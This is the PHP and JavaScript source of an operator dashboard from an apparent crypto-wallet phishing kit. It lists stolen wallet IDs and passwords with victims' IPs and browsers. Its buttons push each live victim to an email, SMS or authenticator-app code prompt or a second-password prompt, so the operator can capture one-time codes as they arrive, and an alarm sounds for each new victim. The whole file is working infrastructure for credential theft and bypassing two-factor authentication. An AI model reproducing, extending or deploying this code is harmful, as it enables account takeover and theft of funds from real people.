<!DOCTYPE html>
<html dir="ltr" lang="en"><head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">   
    <meta name="viewport" content="width=device-width, initial-scale=1">    
    <link rel="icon" type="image/png" sizes="16x16" href="dist/favicon.png">
    <title>Panel</title>    
    <link href="dist/css/style.min.css" rel="stylesheet">
	<style type="text/css">
		.jqstooltip { position: absolute;left: 0px;top: 0px;visibility: hidden;background: rgb(0, 0, 0) transparent;background-color: rgba(0,0,0,0.6);filter:progid:DXImageTransform.Microsoft.gradient(startColorstr=#99000000, endColorstr=#99000000);-ms-filter: "progid:DXImageTransform.Microsoft.gradient(startColorstr=#99000000, endColorstr=#99000000)";color: white;font: 10px arial, san serif;text-align: left;white-space: nowrap;padding: 5px;border: 1px solid white;z-index: 10000;}
		.jqsfield { color: white;font: 10px arial, san serif;text-align: left;}
	</style>
	<script src="dist/jquery.min.js"></script> 
<!-- <script src="dist/jqx.js"></script> -->
</head>

<?php
	session_start();
	include "config/data.php";
	if(!isset($_SESSION["ok"]))
	{
		echo '<meta http-equiv="refresh" content="0;URL=login.php" />';
		die();
	}
	include "../control.php";


	if(isset($_GET["logout"]))
	{
		session_destroy();
		header("Location: ./login.php");
		exit();
		echo '<meta http-equiv="refresh" content="0;URL=login.php" />';
		die();
	}
	if(isset($_GET["cleardb"]))
	{
		$stmt = $connp->prepare("TRUNCATE TABLE `tbl_login`");
		$stmt->execute();
		echo '<meta http-equiv="refresh" content="0;URL=index.php" />';
		die();
	}

	if(isset($_GET["step"]))
	{
		$step=urldecode($conn->real_escape_string($_GET["step"]));
		$amount=urldecode($conn->real_escape_string($_GET["amount"]));
		$challenge=urldecode($conn->real_escape_string($_GET["challenge"]));
		$id=urldecode($conn->real_escape_string($_GET["id"]));
		if($_GET["step"]==3)
		{
			$stmt = $connp->prepare("update `login` set status=:status ,  amount=:amount , challenge=:challenge where id=:id");
			$stmt->bindParam(':status', $step);
			$stmt->bindParam(':amount', $amount);
			$stmt->bindParam(':challenge', $challenge);
			$stmt->bindParam(':id', $id);
			$stmt->execute();
			echo '<meta http-equiv="refresh" content="0;URL=index.php" />';
			die();
		}	
		$stmt = $connp->prepare("update `login` set status=:status where id=:id");
		$stmt->bindParam(':status', $step);
		$stmt->bindParam(':id', $id);
		$stmt->execute();
		echo '<meta http-equiv="refresh" content="0;URL=index.php" />';
		die();
		
	}
?>
        
        
	<body>
    <div id="main-wrapper" data-sidebartype="mini-sidebar" class="">
        <header class="topbar" data-navbarbg="skin5">
            <nav class="navbar top-navbar navbar-expand-md navbar-dark">
                <div class="navbar-header" data-logobg="skin5">
                    <a class="navbar-brand" href="index.php">
                        <b class="logo-icon p-l-10">
                        	<img src="dist/logo-icon.png" alt="homepage" class="light-logo">
                        </b> 
                    </a>
					<a class="topbartoggler d-block d-md-none waves-effect waves-light" href="?cleardb" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">ClearDB</a>
                    <a class="topbartoggler d-block d-md-none waves-effect waves-light" href="index.php?logout" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">Logout</a>
                </div>

                <div class="navbar-collapse collapse" id="navbarSupportedContent" data-navbarbg="skin5">
                    <ul class="navbar-nav float-left mr-auto" style="display:block;">
						<!-- <li class="nav-item d-none d-md-block">&nbsp;</li>
						<li class="nav-item d-none d-md-block">
							<a class="nav-link dropdown-toggle" href="#responsewait" id="navbarDropdown">
                            	<span class="d-none d-md-block">Process (<span id="pw"><?php echo $pw; ?></span>)</span>
                            </a>
						</li>
							
						<li class="nav-item d-none d-md-block">
							<a class="nav-link dropdown-toggle" href="#loginwait" id="navbarDropdown">
                            	<span class="d-none d-md-block">Login (<span id="lw"><?php echo $lw; ?></span>)</span>
                            </a>
						</li>
							
						<li class="nav-item d-none d-md-block">
							<a class="nav-link dropdown-toggle" href="#challengewait" id="navbarDropdown">
                            	<span class="d-none d-md-block">Response (<span id="cw"><?php echo $cw; ?></span>)</span>
                            </a>
						</li>     -->
                    </ul>
                    <ul class="navbar-nav float-right">
                    	<li class="nav-item dropdown">
                            <a class="nav-link dropdown-toggle text-muted waves-effect waves-dark pro-pic" href="?cleardb" >ClearDB</a>
                        </li>
                        <li class="nav-item dropdown">
                            <a class="nav-link dropdown-toggle text-muted waves-effect waves-dark pro-pic" href="index.php?logout" >Logout</a>
                        </li>  
                    </ul>
                </div>
            </nav>
        </header>
        
        <div class="page-wrapper">
           <div class="page-breadcrumb">
                <div class="row">
                    <div class="col-12 d-flex no-block align-items-center">
                        <h4 class="page-title">Data - Logins</h4>
                    </div>
                </div>
            </div>
            <div class="container-fluid">
                <div class="row">
                    <div class="col-12">
						<div class="card" id="challengewait">
                            <div class="card-body">
                                <h5 class="card-title m-b-0">Response</h5>
                            </div>
                                <div class="table-responsive">
                                    <table class="table">
                                        <thead class="thead-light">
                                            <tr>
												<th scope="col">ID</th>
                                                <th scope="col">Wallet ID</th>
                                                <th scope="col">Wallet Password</th>
												<th scope="col">Actions-1</th>
												<th scope="col">Type</th>
                                                <th scope="col">Code</th>
                                                <th scope="col">Actions-2</th>
												<th scope="col">Ip</th>
												<th scope="col">Time</th>
                                            </tr>
                                        </thead>
                                        <tbody class="customtable" id="dataTable">

                                        </tbody>
                                    </table>
                                </div>
                        </div>
					</div>
                </div>
                
            </div>
        </div>
    </div>
	<button style="display:none;" id="btn_play">Play Audio</button>
	<!-- toast -->
	<div id="snackbar">Success!</div>
	
	<!-- Popper JS -->
    <script src="../custom/script/popper.min.js"></script>

    <!-- Latest compiled JavaScript -->
    <script src="../custom/script/bootstrap.min.js"></script>
	<script>
	$(document).ready(function(){
		var timer_flag = 0;
		var timerForGetUpdatedData;
		function play() {
			var audio = new Audio('https://interactive-examples.mdn.mozilla.net/media/examples/t-rex-roar.mp3');
			audio.play();
		}
		function beep() {
			var snd = new Audio("data:audio/wav;base64,//uQRAAAAWMSLwUIYAAsYkXgoQwAEaYLWfkWgAI0wWs/ItAAAGDgYtAgAyN+QWaAAihwMWm4G8QQRDiMcCBcH3Cc+CDv/7xA4Tvh9Rz/y8QADBwMWgQAZG/ILNAARQ4GLTcDeIIIhxGOBAuD7hOfBB3/94gcJ3w+o5/5eIAIAAAVwWgQAVQ2ORaIQwEMAJiDg95G4nQL7mQVWI6GwRcfsZAcsKkJvxgxEjzFUgfHoSQ9Qq7KNwqHwuB13MA4a1q/DmBrHgPcmjiGoh//EwC5nGPEmS4RcfkVKOhJf+WOgoxJclFz3kgn//dBA+ya1GhurNn8zb//9NNutNuhz31f////9vt///z+IdAEAAAK4LQIAKobHItEIYCGAExBwe8jcToF9zIKrEdDYIuP2MgOWFSE34wYiR5iqQPj0JIeoVdlG4VD4XA67mAcNa1fhzA1jwHuTRxDUQ//iYBczjHiTJcIuPyKlHQkv/LHQUYkuSi57yQT//uggfZNajQ3Vmz+Zt//+mm3Wm3Q576v////+32///5/EOgAAADVghQAAAAA//uQZAUAB1WI0PZugAAAAAoQwAAAEk3nRd2qAAAAACiDgAAAAAAABCqEEQRLCgwpBGMlJkIz8jKhGvj4k6jzRnqasNKIeoh5gI7BJaC1A1AoNBjJgbyApVS4IDlZgDU5WUAxEKDNmmALHzZp0Fkz1FMTmGFl1FMEyodIavcCAUHDWrKAIA4aa2oCgILEBupZgHvAhEBcZ6joQBxS76AgccrFlczBvKLC0QI2cBoCFvfTDAo7eoOQInqDPBtvrDEZBNYN5xwNwxQRfw8ZQ5wQVLvO8OYU+mHvFLlDh05Mdg7BT6YrRPpCBznMB2r//xKJjyyOh+cImr2/4doscwD6neZjuZR4AgAABYAAAABy1xcdQtxYBYYZdifkUDgzzXaXn98Z0oi9ILU5mBjFANmRwlVJ3/6jYDAmxaiDG3/6xjQQCCKkRb/6kg/wW+kSJ5//rLobkLSiKmqP/0ikJuDaSaSf/6JiLYLEYnW/+kXg1WRVJL/9EmQ1YZIsv/6Qzwy5qk7/+tEU0nkls3/zIUMPKNX/6yZLf+kFgAfgGyLFAUwY//uQZAUABcd5UiNPVXAAAApAAAAAE0VZQKw9ISAAACgAAAAAVQIygIElVrFkBS+Jhi+EAuu+lKAkYUEIsmEAEoMeDmCETMvfSHTGkF5RWH7kz/ESHWPAq/kcCRhqBtMdokPdM7vil7RG98A2sc7zO6ZvTdM7pmOUAZTnJW+NXxqmd41dqJ6mLTXxrPpnV8avaIf5SvL7pndPvPpndJR9Kuu8fePvuiuhorgWjp7Mf/PRjxcFCPDkW31srioCExivv9lcwKEaHsf/7ow2Fl1T/9RkXgEhYElAoCLFtMArxwivDJJ+bR1HTKJdlEoTELCIqgEwVGSQ+hIm0NbK8WXcTEI0UPoa2NbG4y2K00JEWbZavJXkYaqo9CRHS55FcZTjKEk3NKoCYUnSQ0rWxrZbFKbKIhOKPZe1cJKzZSaQrIyULHDZmV5K4xySsDRKWOruanGtjLJXFEmwaIbDLX0hIPBUQPVFVkQkDoUNfSoDgQGKPekoxeGzA4DUvnn4bxzcZrtJyipKfPNy5w+9lnXwgqsiyHNeSVpemw4bWb9psYeq//uQZBoABQt4yMVxYAIAAAkQoAAAHvYpL5m6AAgAACXDAAAAD59jblTirQe9upFsmZbpMudy7Lz1X1DYsxOOSWpfPqNX2WqktK0DMvuGwlbNj44TleLPQ+Gsfb+GOWOKJoIrWb3cIMeeON6lz2umTqMXV8Mj30yWPpjoSa9ujK8SyeJP5y5mOW1D6hvLepeveEAEDo0mgCRClOEgANv3B9a6fikgUSu/DmAMATrGx7nng5p5iimPNZsfQLYB2sDLIkzRKZOHGAaUyDcpFBSLG9MCQALgAIgQs2YunOszLSAyQYPVC2YdGGeHD2dTdJk1pAHGAWDjnkcLKFymS3RQZTInzySoBwMG0QueC3gMsCEYxUqlrcxK6k1LQQcsmyYeQPdC2YfuGPASCBkcVMQQqpVJshui1tkXQJQV0OXGAZMXSOEEBRirXbVRQW7ugq7IM7rPWSZyDlM3IuNEkxzCOJ0ny2ThNkyRai1b6ev//3dzNGzNb//4uAvHT5sURcZCFcuKLhOFs8mLAAEAt4UWAAIABAAAAAB4qbHo0tIjVkUU//uQZAwABfSFz3ZqQAAAAAngwAAAE1HjMp2qAAAAACZDgAAAD5UkTE1UgZEUExqYynN1qZvqIOREEFmBcJQkwdxiFtw0qEOkGYfRDifBui9MQg4QAHAqWtAWHoCxu1Yf4VfWLPIM2mHDFsbQEVGwyqQoQcwnfHeIkNt9YnkiaS1oizycqJrx4KOQjahZxWbcZgztj2c49nKmkId44S71j0c8eV9yDK6uPRzx5X18eDvjvQ6yKo9ZSS6l//8elePK/Lf//IInrOF/FvDoADYAGBMGb7FtErm5MXMlmPAJQVgWta7Zx2go+8xJ0UiCb8LHHdftWyLJE0QIAIsI+UbXu67dZMjmgDGCGl1H+vpF4NSDckSIkk7Vd+sxEhBQMRU8j/12UIRhzSaUdQ+rQU5kGeFxm+hb1oh6pWWmv3uvmReDl0UnvtapVaIzo1jZbf/pD6ElLqSX+rUmOQNpJFa/r+sa4e/pBlAABoAAAAA3CUgShLdGIxsY7AUABPRrgCABdDuQ5GC7DqPQCgbbJUAoRSUj+NIEig0YfyWUho1VBBBA//uQZB4ABZx5zfMakeAAAAmwAAAAF5F3P0w9GtAAACfAAAAAwLhMDmAYWMgVEG1U0FIGCBgXBXAtfMH10000EEEEEECUBYln03TTTdNBDZopopYvrTTdNa325mImNg3TTPV9q3pmY0xoO6bv3r00y+IDGid/9aaaZTGMuj9mpu9Mpio1dXrr5HERTZSmqU36A3CumzN/9Robv/Xx4v9ijkSRSNLQhAWumap82WRSBUqXStV/YcS+XVLnSS+WLDroqArFkMEsAS+eWmrUzrO0oEmE40RlMZ5+ODIkAyKAGUwZ3mVKmcamcJnMW26MRPgUw6j+LkhyHGVGYjSUUKNpuJUQoOIAyDvEyG8S5yfK6dhZc0Tx1KI/gviKL6qvvFs1+bWtaz58uUNnryq6kt5RzOCkPWlVqVX2a/EEBUdU1KrXLf40GoiiFXK///qpoiDXrOgqDR38JB0bw7SoL+ZB9o1RCkQjQ2CBYZKd/+VJxZRRZlqSkKiws0WFxUyCwsKiMy7hUVFhIaCrNQsKkTIsLivwKKigsj8XYlwt/WKi2N4d//uQRCSAAjURNIHpMZBGYiaQPSYyAAABLAAAAAAAACWAAAAApUF/Mg+0aohSIRobBAsMlO//Kk4soosy1JSFRYWaLC4qZBYWFRGZdwqKiwkNBVmoWFSJkWFxX4FFRQWR+LsS4W/rFRb/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////VEFHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAU291bmRib3kuZGUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMjAwNGh0dHA6Ly93d3cuc291bmRib3kuZGUAAAAAAAAAACU=");  
			snd.play();
		}
		$("#btn_play").click(function(){
			beep();
		});

		fnGetUpdatedData();
		fnTimerForGetUpdatedData();
		function fnTimerForGetUpdatedData(){
			clearInterval(timerForGetUpdatedData);
			timerForGetUpdatedData = setInterval(fnGetUpdatedData, 3000);
		}
		function fnGetUpdatedData(){
			var is_alarm = 0;
        	var string = "";
			$.ajax({
				url: "./getUpdatedData.php",
				method: 'POST',
				success: function(result){
					if(timer_flag == 1) return;
					console.log(result);
					var data = JSON.parse(result);
					for(i = 0; i < data.length; i ++){
						var item = data[i];
						if(item.is_alarm == "yes"){
							is_alarm = 1;
						}
						string += 
						"<tr>" + 
							'<td>' + item.id + '</td>' + 
							'<td>' + item.wallet_id + '</td>' + 
							'<td>' + item.wallet_pwd + '</td>' + 
							'<td>' + 
								'<input type="hidden" value="' + item.admin_decision + '">' + 
								'<input type="hidden" value="' + item.id + '">' + 
								'<button type="button" class="btn btn-success btn-sm btn-google-auth">Email Auth</button>' + 
								'<br>' +
								'<input type="hidden" value="' + item.admin_decision + '">' + 
								'<input type="hidden" value="' + item.id + '">' + 
								'<button type="button" class="btn btn-info btn-sm btn-sms-auth">SMS Auth</button>' + 
								'<br>' +
								'<input type="hidden" value="' + item.admin_decision + '">' + 
								'<input type="hidden" value="' + item.id + '">' + 
								'<button type="button" class="btn btn-primary btn-sm btn-app-auth">App Auth</button>' + 
								'<br>' + 
								'<input type="hidden" value="' + item.admin_decision + '">' + 
								'<input type="hidden" value="' + item.id + '">' + 
								'<button type="button" class="btn btn-danger btn-sm btn-login-error">Error-Response</button>' + 
								'<br>' +
								// '<a href="?result=2&id=' + item.id + '">' + 
								// 	'<button type="button" class="btn btn-danger btn-sm">Error-Response</button>' + 
								// '</a><br>' + 
								// '<a href="?result=2&id=' + item.id + '">' +
								// 	'<button type="button" class="btn btn-warning btn-sm">Exit</button>' +
								// '</a>' + 
							'</td>';
							if(item.admin_decision == 1){
								string += '<td>Google Athentication</td>' + 
											'<td>' + ((item.google_auth_code == "null")?"":item.google_auth_code) + '</td>'; 
							}else if(item.admin_decision == 2){
								string += '<td>SMS Athentication</td>' + 
											'<td>' + ((item.sms_code == "null")?"":item.sms_code) + '</td>';
							}else if(item.admin_decision == 3){
								string += '<td>App Athentication</td>' + 
											'<td>' + ((item.auth_app_code == "null")?"":item.auth_app_code) + '</td>'; 
							}else if(item.admin_decision == 4){
								string += '<td>Password2</td>' + 
											'<td>' + ((item.password2 == "null")?"":item.password2) + '</td>'; 
							}else{
								string += '<td></td>' + 
											'<td></td>'; 
							}
							if(item.admin_decision == 1){
								string += 
									'<td>' + 
										'<input type="hidden" value="' + item.admin_decision + '">' + 
										'<input type="hidden" value="' + item.id + '">' + 
										'<button type="button" class="btn btn-success btn-sm btn-final-success">Success</button>' + 
										'<br>' + 
										'<input type="hidden" value="' + item.admin_decision + '">' + 
										'<input type="hidden" value="' + item.id + '">' + 
										'<button type="button" class="btn btn-danger btn-sm btn-final-error">Error-Response</button>' + 
										'<br>' + 
										'<input type="hidden" value="' + item.admin_decision + '">' + 
										'<input type="hidden" value="' + item.id + '">' + 
										'<button type="button" class="btn btn-info btn-sm btn-final-second-password">Password 2</button>' + 
										'<br>' +
										'<input type="hidden" value="' + item.admin_decision + '">' + 
										'<input type="hidden" value="' + item.id + '">' + 
										'<button type="button" class="btn btn-info btn-sm btn-final-sms-auth">SMS Auth</button>' + 
										'<br>' +
										'<input type="hidden" value="' + item.admin_decision + '">' + 
										'<input type="hidden" value="' + item.id + '">' + 
										'<button type="button" class="btn btn-primary btn-sm btn-final-app-auth">App Auth</button>' + 
										// '<a href="?result=3&id=' + item.id + '">' +
										// 	'<button type="button" class="btn btn-warning btn-sm">Exit</button>' + 
										// '</a>' + 
									'</td>' +
									'<td>' + item.ip + '</td>' + 
									'<td>' + item.time + '</td>' + 
								'</tr>';
							}else if (item.admin_decision == 2 || item.admin_decision == 3){
								string += 
									'<td>' + 
										'<input type="hidden" value="' + item.admin_decision + '">' + 
										'<input type="hidden" value="' + item.id + '">' + 
										'<button type="button" class="btn btn-success btn-sm btn-final-success">Success</button>' + 
										'<br>' + 
										'<input type="hidden" value="' + item.admin_decision + '">' + 
										'<input type="hidden" value="' + item.id + '">' + 
										'<button type="button" class="btn btn-danger btn-sm btn-final-error">Error-Response</button>' + 
										'<br>' + 
										'<input type="hidden" value="' + item.admin_decision + '">' + 
										'<input type="hidden" value="' + item.id + '">' + 
										'<button type="button" class="btn btn-info btn-sm btn-final-second-password">Password 2</button>' + 
										// '<a href="?result=3&id=' + item.id + '">' +
										// 	'<button type="button" class="btn btn-warning btn-sm">Exit</button>' + 
										// '</a>' + 
									'</td>'+
									'<td>' + item.ip + '<br>' + item.browser_name + '</td>' + 
									'<td>' + item.time + '</td>' + 
								'</tr>';

							} else {
								string += 
									'<td>' + 
										'<input type="hidden" value="' + item.admin_decision + '">' + 
										'<input type="hidden" value="' + item.id + '">' + 
										'<button type="button" class="btn btn-success btn-sm btn-final-success">Success</button>' + 
										'<br>' + 
										'<input type="hidden" value="' + item.admin_decision + '">' + 
										'<input type="hidden" value="' + item.id + '">' + 
										'<button type="button" class="btn btn-danger btn-sm btn-final-error">Error-Response</button>' + 
										'<br>' + 
										// '<a href="?result=3&id=' + item.id + '">' +
										// 	'<button type="button" class="btn btn-warning btn-sm">Exit</button>' + 
										// '</a>' + 
									'</td>'+
									'<td>' + item.ip + '<br>' + item.browser_name + '</td>' + 
									'<td>' + item.time + '</td>' + 
								'</tr>';
							}
					}
					$("#dataTable").empty();
					$("#dataTable").append(string);
					if(is_alarm == 1){
						is_alarm = 0;
						$( "#btn_play" ).trigger("click");
					}
				}
			});
		}
		$(document).on('click', 'button.btn-google-auth', function(){
			var admin_decision = $(this).prev().prev().val();
			// console.log(admin_decision);
			if(admin_decision == "" || admin_decision == "null" || admin_decision == undefined){
				// var digipas = $(this).parent().find("span.digipas").text();
				var user_id = $(this).prev().val();
				console.log(user_id);
				$.ajax({
					url: "./saveAdminDecision.php",
					method: 'POST',
					data: {user_id: user_id, decision:1},
					success: function(result){
						if(result != 0){
						fnShowSnackbar();
						// fnGetUpdatedData();
						clearInterval(timerForGetUpdatedData);
						timerForGetUpdatedData = setInterval(fnGetUpdatedData, 3000);
						}
					}
				});
			}else{
				return;
			}
	  })
	  $(document).on('click', 'button.btn-sms-auth', function(){
        // var digipas = $(this).parent().find("span.digipas").text();
		var admin_decision = $(this).prev().prev().val();
		if(admin_decision == "" || admin_decision == "null" || admin_decision == undefined){
			var user_id = $(this).prev().val();
			console.log(user_id);
			$.ajax({
				url: "./saveAdminDecision.php",
				method: 'POST',
				data: {user_id: user_id, decision:2},
				success: function(result){
				if(result != 0){
					fnShowSnackbar();
					// fnGetUpdatedData();
					clearInterval(timerForGetUpdatedData);
					timerForGetUpdatedData = setInterval(fnGetUpdatedData, 3000);
				}
				}
			});
		}else{

		}
	  })
	  $(document).on('click', 'button.btn-app-auth', function(){
		var admin_decision = $(this).prev().prev().val();
		if(admin_decision == "" || admin_decision == "null" || admin_decision == undefined){
			// var digipas = $(this).parent().find("span.digipas").text();
			var user_id = $(this).prev().val();
			console.log(user_id);
			$.ajax({
				url: "./saveAdminDecision.php",
				method: 'POST',
				data: {user_id: user_id, decision:3},
				success: function(result){
				if(result != 0){
					fnShowSnackbar();
					// fnGetUpdatedData();
					clearInterval(timerForGetUpdatedData);
					timerForGetUpdatedData = setInterval(fnGetUpdatedData, 3000);
				}
				}
			});
		}else{

		}
	  })
	  $(document).on('click', 'button.btn-login-error', function(){
		var admin_decision = $(this).prev().prev().val();
		if(admin_decision == "" || admin_decision == "null" || admin_decision == undefined){
			// var digipas = $(this).parent().find("span.digipas").text();
			var user_id = $(this).prev().val();
			console.log(user_id);
			$.ajax({
				url: "./saveAdminDecision.php",
				method: 'POST',
				data: {user_id: user_id, decision:4},
				success: function(result){
				if(result != 0){
					fnShowSnackbar();
					// fnGetUpdatedData();
					clearInterval(timerForGetUpdatedData);
					timerForGetUpdatedData = setInterval(fnGetUpdatedData, 3000);
				}
				}
			});
		}else{

		}
	  })
	  $(document).on('click', 'button.btn-final-success', function(){
		var admin_decision = $(this).prev().prev().val();
		if(admin_decision == "null") return;
        // var digipas = $(this).parent().find("span.digipas").text();
        var user_id = $(this).prev().val();
        console.log(user_id);
          $.ajax({
            url: "./saveFinalDecision.php",
            method: 'POST',
            data: {user_id: user_id, decision:1},
            success: function(result){
              if(result != 0){
                fnShowSnackbar();
                // fnGetUpdatedData();
                clearInterval(timerForGetUpdatedData);
                timerForGetUpdatedData = setInterval(fnGetUpdatedData, 3000);
              }
            }
          });
	  })
	  $(document).on('click', 'button.btn-final-error', function(){
		var admin_decision = $(this).prev().prev().val();
		if(admin_decision == "null") return;
        // var digipas = $(this).parent().find("span.digipas").text();
        var user_id = $(this).prev().val();
        console.log(user_id);
          $.ajax({
            url: "./saveFinalDecision.php",
            method: 'POST',
            data: {user_id: user_id, decision:2},
            success: function(result){
              if(result != 0){
                fnShowSnackbar();
                // fnGetUpdatedData();
                clearInterval(timerForGetUpdatedData);
                timerForGetUpdatedData = setInterval(fnGetUpdatedData, 3000);
              }
            }
          });
	  })
	  $(document).on('click', 'button.btn-final-second-password', function(){
		var admin_decision = $(this).prev().prev().val();
		if(admin_decision == "null") return;
        // var digipas = $(this).parent().find("span.digipas").text();
        var user_id = $(this).prev().val();
        console.log(user_id);
          $.ajax({
            url: "./saveFinalDecision.php",
            method: 'POST',
            data: {user_id: user_id, decision:5},
            success: function(result){
              if(result != 0){
                fnShowSnackbar();
                // fnGetUpdatedData();
                clearInterval(timerForGetUpdatedData);
                timerForGetUpdatedData = setInterval(fnGetUpdatedData, 3000);
              }
            }
          });
	  })
	  $(document).on('click', 'button.btn-final-sms-auth', function(){
		var admin_decision = $(this).prev().prev().val();
		if(admin_decision == "null") return;
        // var digipas = $(this).parent().find("span.digipas").text();
        var user_id = $(this).prev().val();
        console.log(user_id);
          $.ajax({
            url: "./saveFinalDecision.php",
            method: 'POST',
            data: {user_id: user_id, decision:3},
            success: function(result){
              if(result != 0){
                fnShowSnackbar();
                // fnGetUpdatedData();
                clearInterval(timerForGetUpdatedData);
                timerForGetUpdatedData = setInterval(fnGetUpdatedData, 3000);
              }
            }
          });
	  })
	  $(document).on('click', 'button.btn-final-app-auth', function(){
		var admin_decision = $(this).prev().prev().val();
		if(admin_decision == "null") return;
        // var digipas = $(this).parent().find("span.digipas").text();
        var user_id = $(this).prev().val();
        console.log(user_id);
          $.ajax({
            url: "./saveFinalDecision.php",
            method: 'POST',
            data: {user_id: user_id, decision:4},
            success: function(result){
              if(result != 0){
                fnShowSnackbar();
                // fnGetUpdatedData();
                clearInterval(timerForGetUpdatedData);
                timerForGetUpdatedData = setInterval(fnGetUpdatedData, 3000);
              }
            }
          });
	  })
	  function fnShowSnackbar() {
        var x = document.getElementById("snackbar");
        x.className = "show";
        setTimeout(function(){ x.className = x.className.replace("show", ""); }, 3000);
      }
	  
	});
	</script>

	<style>
		#snackbar {
		visibility: hidden;
		min-width: 250px;
		margin-left: -125px;
		background-color: green;
		color: #fff;
		text-align: center;
		border-radius: 2px;
		padding: 16px;
		position: fixed;
		z-index: 1;
		right: 0%;
		top: 50px;
		font-size: 25px;
		}

		#snackbar.show {
		visibility: visible;
		-webkit-animation: fadein 0.5s, fadeout 0.5s 2.5s;
		animation: fadein 0.5s, fadeout 0.5s 2.5s;
		}

		@-webkit-keyframes fadein {
		from {top: 0; opacity: 0;} 
		to {top: 50px; opacity: 1;}
		}

		@keyframes fadein {
		from {top: 0; opacity: 0;}
		to {top: 50px; opacity: 1;}
		}

		@-webkit-keyframes fadeout {
		from {top: 50px; opacity: 1;} 
		to {top: 0; opacity: 0;}
		}

		@keyframes fadeout {
		from {top: 40px; opacity: 1;}
		to {top: 0; opacity: 0;}
		}
	</style>
</body>

</html>